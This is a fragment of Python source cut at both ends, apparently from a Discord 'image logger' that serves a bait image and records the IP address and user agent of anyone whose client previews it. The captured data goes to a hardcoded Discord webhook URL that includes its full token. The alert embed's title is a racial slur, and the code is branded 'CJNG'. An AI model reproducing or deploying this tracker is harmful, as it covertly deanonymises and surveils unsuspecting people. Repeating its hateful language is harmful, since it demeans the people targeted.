...
webhook = 'https://discord.com/api/webhooks/1491261326385746052/_60K27ryjuWw_QlDmymW67f7k5894PXrwjK5H03hF-Zwl2FhKfCEEnFrxPT4pfp4u5jX'

bindata = httpx.get('https://upload.wikimedia.org/wikipedia/commons/thumb/5/50/Black_colour.jpg/960px-Black_colour.jpg?_=20170110114905').content
  ...
  "embeds": [
    {
      "title": "NIGGER Alert!",
      "color": 16711803,
      "description": f"Discord previewed a CJNG Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
      "author": {
        "name": "CJNG"
      },
      "fields": [
